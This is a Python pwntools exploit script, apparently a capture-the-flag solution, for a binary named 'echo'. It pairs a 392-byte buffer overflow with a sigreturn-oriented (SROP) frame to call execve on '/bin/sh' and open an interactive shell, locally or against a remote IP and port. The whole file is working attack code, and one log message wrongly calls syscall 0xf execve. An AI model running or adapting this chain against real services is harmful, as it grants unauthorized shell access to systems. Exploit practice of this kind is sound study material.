#!/usr/bin/env python3
from pwn import ELF, process, remote, log, p64, args, gdb, context, SigreturnFrame, pause

context.arch = 'amd64'

OFFSET = b'A' * 392
FILE = './echo'
BINARY = ELF(FILE)
READ_SYSCALL = 0x40100b
IMUL = 0x401037
SYSCALL = 0x401031
ECHO = 0x401000
BINSH = 0x401035

def start():
    if args.REMOTE:
        return remote('161.97.176.150', 9090)

    p = process(FILE)
    if args.NOTRACE:
        return p

    gdb.attach(p)
    return p


payload = OFFSET
payload += p64(ECHO)
payload += p64(SYSCALL)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdx = 0x0
frame.rsi = 0x0
frame.rdi = BINSH
frame.rip = SYSCALL

payload += bytes(frame)

p = start()
log.info("Sending SROP chain")
p.sendline(payload)
res = p.recvline()
log.info("SROP chain executed, arguments are set")
log.info("Sending 15 bytes long payload to set RAX to 0xf (execve syscall)")
p.sendline(b'A'*14)
res = p.recvline()
log.info("Payload sent, here is shell:")
p.interactive()
